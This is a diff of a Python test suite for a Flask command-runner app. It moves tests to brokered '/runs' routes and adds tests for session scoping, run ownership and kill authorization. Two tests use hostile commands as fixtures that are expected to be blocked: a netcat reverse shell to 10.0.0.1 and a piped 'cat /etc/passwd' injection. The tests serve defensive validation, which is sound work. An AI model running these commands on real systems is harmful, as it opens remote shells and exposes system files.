@@ -36,6 +36,27 @@ def get_client(*, use_forwarded_for=True):
     return client
 
 
+class _RouteFakeProc:
+    def __init__(self, pid=4321):
+        self.pid = pid
+        self.stdout = mock.Mock()
+
+
+class _CapturedThread:
+    instances = []
+
+    def __init__(self, *, target=None, kwargs=None, name="", daemon=None):
+        self.target = target
+        self.kwargs = kwargs or {}
+        self.name = name
+        self.daemon = daemon
+        self.started = False
+        self.__class__.instances.append(self)
+
+    def start(self):
+        self.started = True
+
+
 # ── / ─────────────────────────────────────────────────────────────────────────
 
 class TestIndexRoute:
@@ -1350,62 +1371,245 @@ class TestWorkspaceRoutes:
             shell_app._last_workspace_cleanup_monotonic = previous_cleanup
 
 
-# ── /run ──────────────────────────────────────────────────────────────────────
+# ── /runs ─────────────────────────────────────────────────────────────────────
 
 class TestRunRoute:
-    def test_missing_command_returns_400(self):
+    def test_brokered_run_requires_available_broker(self):
         client = get_client()
-        resp = client.post("/run", json={})
-        assert resp.status_code == 400
+        with mock.patch("blueprints.run.broker_available", return_value=False), \
+             mock.patch("blueprints.run.broker_unavailable_reason", return_value="broker unavailable"):
+            resp = client.post("/runs", json={"command": "echo hi"})
+        assert resp.status_code == 503
+        assert json.loads(resp.data)["error"] == "broker unavailable"
 
-    def test_empty_command_returns_400(self):
+    def test_brokered_run_missing_runtime_returns_synthetic_stream_reference(self):
         client = get_client()
-        resp = client.post("/run", json={"command": "   "})
-        assert resp.status_code == 400
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
+             mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)), \
+             mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"), \
+             mock.patch("blueprints.run._brokered_synthetic_run", return_value="run-missing") as synthetic, \
+             mock.patch("blueprints.run.subprocess.Popen") as popen:
+            resp = client.post(
+                "/runs",
+                json={"command": "nmap -sV darklab.sh"},
+                headers={"X-Session-ID": "session-1"},
+            )
+        assert resp.status_code == 202
+        assert json.loads(resp.data) == {
+            "run_id": "run-missing",
+            "stream": "/runs/run-missing/stream",
+        }
+        synthetic.assert_called_once()
+        args = synthetic.call_args.args
+        assert args[0] == "nmap -sV darklab.sh"
+        assert args[3] == [{"type": "output", "text": "Command is not installed on this instance: nmap"}]
+        assert args[4] == 127
+        assert synthetic.call_args.kwargs == {"cmd_type": "missing"}
+        popen.assert_not_called()
 
-    def test_non_string_command_returns_400(self):
+    def test_brokered_run_rejects_invalid_command_payloads(self):
         client = get_client()
-        resp = client.post("/run", json={"command": 123})
-        assert resp.status_code == 400
-        assert json.loads(resp.data)["error"] == "Command must be a string"
+        with mock.patch("blueprints.run.broker_available", return_value=True):
+            non_object = client.post("/runs", json=["hostname"])
+            missing = client.post("/runs", json={})
+            non_string = client.post("/runs", json={"command": 42})
+            blank = client.post("/runs", json={"command": "   "})
 
-    def test_non_object_json_returns_400(self):
+        assert non_object.status_code == 400
+        assert json.loads(non_object.data) == {"error": "Request body must be a JSON object"}
+        assert missing.status_code == 400
+        assert json.loads(missing.data) == {"error": "No command provided"}
+        assert non_string.status_code == 400
+        assert json.loads(non_string.data) == {"error": "Command must be a string"}
+        assert blank.status_code == 400
+        assert json.loads(blank.data) == {"error": "No command provided"}
+
+    def test_brokered_run_disallowed_command_returns_403_before_spawning(self):
         client = get_client()
-        resp = client.post("/run", json=["not", "an", "object"])
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("blueprints.run.is_command_allowed", return_value=(False, "blocked")), \
+             mock.patch("blueprints.run.subprocess.Popen") as popen:
+            resp = client.post("/runs", json={"command": "nmap -sS 127.0.0.1"})
+
+        assert resp.status_code == 403
+        assert json.loads(resp.data) == {"error": "blocked"}
+        popen.assert_not_called()
+
+    def test_brokered_run_starts_real_process_and_registers_active_run(self):
+        client = get_client()
+        fake_proc = _RouteFakeProc(pid=8765)
+        _CapturedThread.instances = []
+
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
+             mock.patch("blueprints.run.rewrite_command", return_value=("ping darklab.sh", "rewritten")), \
+             mock.patch("blueprints.run.runtime_missing_command_name", return_value=None), \
+             mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen, \
+             mock.patch("blueprints.run.pid_register") as pid_register, \
+             mock.patch("blueprints.run.active_run_register") as active_register, \
+             mock.patch("blueprints.run.publish_run_event") as publish, \
+             mock.patch("blueprints.run.threading", mock.Mock(Thread=_CapturedThread)), \
+             mock.patch("blueprints.run.uuid.uuid4", return_value="run-real"):
+            resp = client.post(
+                "/runs",
+                json={"command": "ping darklab.sh", "tab_id": "tab-1"},
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
+            )
+
+        assert resp.status_code == 202
+        assert json.loads(resp.data) == {
+            "run_id": "run-real",
+            "stream": "/runs/run-real/stream",
+        }
+        launched = popen.call_args.args[0]
+        assert launched[-2:] == ["-c", "ping darklab.sh"]
+        pid_register.assert_called_once_with("run-real", 8765)
+        active_register.assert_called_once()
+        assert active_register.call_args.args[:4] == (
+            "run-real",
+            8765,
+            "session-1",
+            "ping darklab.sh",
+        )
+        assert active_register.call_args.kwargs == {
+            "owner_client_id": "client-1",
+            "owner_tab_id": "tab-1",
+        }
+        publish.assert_called_once()
+        assert publish.call_args.args[:2] == ("run-real", "started")
+        assert publish.call_args.args[2]["run_id"] == "run-real"
+        assert len(_CapturedThread.instances) == 1
+        thread = _CapturedThread.instances[0]
+        assert thread.started is True
+        assert thread.daemon is True
+        assert thread.name == "run-broker-run-real"
+        assert thread.kwargs["run_id"] == "run-real"
+        assert thread.kwargs["proc"] is fake_proc
+        assert thread.kwargs["session_id"] == "session-1"
+        assert thread.kwargs["original_command"] == "ping darklab.sh"
+        assert thread.kwargs["rewrite_notice"] == "rewritten"
+
+    def test_brokered_run_events_returns_session_scoped_backfill(self):
+        client = get_client()
+        fake_event = mock.Mock(event_id="10-0", payload={"type": "output", "text": "hello"})
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
+             mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as get_events:
+            resp = client.get(
+                "/runs/run-1/events?after=9-0&limit=25",
+                headers={"X-Session-ID": "session-1"},
+            )
+        assert resp.status_code == 200
+        assert json.loads(resp.data) == {
+            "run_id": "run-1",
+            "events": [{"event_id": "10-0", "type": "output", "text": "hello"}],
+        }
+        get_events.assert_called_once_with("run-1", after_id="9-0", limit=25)
+
+    def test_brokered_run_events_rejects_runs_outside_session(self):
+        client = get_client()
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
+             mock.patch("blueprints.run.get_run_events") as get_events:
+            resp = client.get(
+                "/runs/run-other/events",
+                headers={"X-Session-ID": "session-1"},
+            )
+
+        assert resp.status_code == 404
+        assert json.loads(resp.data) == {"error": "Run not found"}
+        get_events.assert_not_called()
+
+    def test_brokered_run_stream_replays_events_for_session_run(self):
+        client = get_client()
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
+             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: one\n\n"])), \
+             mock.patch("blueprints.run.active_run_touch_owner") as touch:
+            resp = client.get(
+                "/runs/run-1/stream?after=9-0&tab_id=tab-1",
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
+            )
+            body = resp.get_data(as_text=True)
+        assert resp.status_code == 200
+        assert body == "data: one\n\n"
+        touch.assert_called_once_with("run-1", "client-1", "tab-1")
+
+    def test_brokered_run_stream_rejects_runs_outside_session(self):
+        client = get_client()
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
+             mock.patch("blueprints.run.stream_run_events") as stream_events:
+            resp = client.get(
+                "/runs/run-other/stream",
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
+            )
+
+        assert resp.status_code == 404
+        assert json.loads(resp.data) == {"error": "Run not found"}
+        stream_events.assert_not_called()
+
+    def test_brokered_run_owner_takeover_requires_client_id(self):
+        client = get_client()
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]):
+            resp = client.post(
+                "/runs/run-1/owner",
+                headers={"X-Session-ID": "session-1"},
+                json={"tab_id": "tab-2"},
+            )
         assert resp.status_code == 400
-        assert json.loads(resp.data)["error"] == "Request body must be a JSON object"
+        assert json.loads(resp.data)["error"] == "Client identity is required to take over a run."
+
+    def test_brokered_run_owner_takeover_claims_active_run(self):
+        client = get_client()
+        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
+             mock.patch("blueprints.run.active_run_set_owner", return_value=True) as set_owner, \
+             mock.patch("blueprints.run.publish_run_event") as publish:
+            resp = client.post(
+                "/runs/run-1/owner",
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
+                json={"tab_id": "tab-2"},
+            )
+        assert resp.status_code == 200
+        assert json.loads(resp.data) == {"ok": True, "run_id": "run-1"}
+        set_owner.assert_called_once_with("run-1", "client-2", "tab-2")
+        publish.assert_called_once_with("run-1", "owner", {
+            "owner_client_id": "client-2",
+            "owner_tab_id": "tab-2",
+        })
+
+    def test_kill_rejects_non_owner_for_live_owned_run(self):
+        client = get_client()
+        with mock.patch("blueprints.run.active_run_control_status", return_value="forbidden"), \
+             mock.patch("blueprints.run.pid_pop_for_session") as pop_pid:
+            resp = client.post(
+                "/kill",
+                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-old"},
+                json={"run_id": "run-1"},
+            )
+        assert resp.status_code == 403
+        assert json.loads(resp.data)["error"] == (
+            "This browser no longer controls that run. Use Take over from Run Monitor before killing it."
+        )
+        pop_pid.assert_not_called()
 
     def test_disallowed_command_returns_403(self):
         client = get_client()
         # Patch in commands' namespace — is_command_allowed calls load_command_policy
         # from commands' own namespace, not from app's.
-        with mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
-            resp = client.post("/run", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
+            resp = client.post("/runs", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
         assert resp.status_code == 403
 
     def test_shell_operator_returns_403(self):
         client = get_client()
-        with mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
-            resp = client.post("/run", json={"command": "ping google.com | cat /etc/passwd"})
+        with mock.patch("blueprints.run.broker_available", return_value=True), \
+             mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
+            resp = client.post("/runs", json={"command": "ping google.com | cat /etc/passwd"})
         assert resp.status_code == 403
-
-    def test_missing_allowlisted_command_returns_synthetic_run(self):
-        client = get_client()
-        with mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
-             mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)), \
-             mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"), \
-             mock.patch("blueprints.run.subprocess.Popen") as popen:
-            resp = client.post("/run", json={"command": "nmap -sV darklab.sh"})
-            body = resp.get_data(as_text=True)
-        assert resp.status_code == 200
-        assert '"type": "started"' in body
-        assert "Command is not installed on this instance: nmap\\n" in body
-        assert '"type": "exit"' in body
-        popen.assert_not_called()
 
     def test_non_json_body_handled(self):
         client = get_client()
-        resp = client.post("/run", data="not json", content_type="text/plain")
+        with mock.patch("blueprints.run.broker_available", return_value=True):
+            resp = client.post("/runs", data="not json", content_type="text/plain")
         # Should not crash — Flask returns 400 or 415 for bad content type
         assert resp.status_code in (400, 415, 500)
 
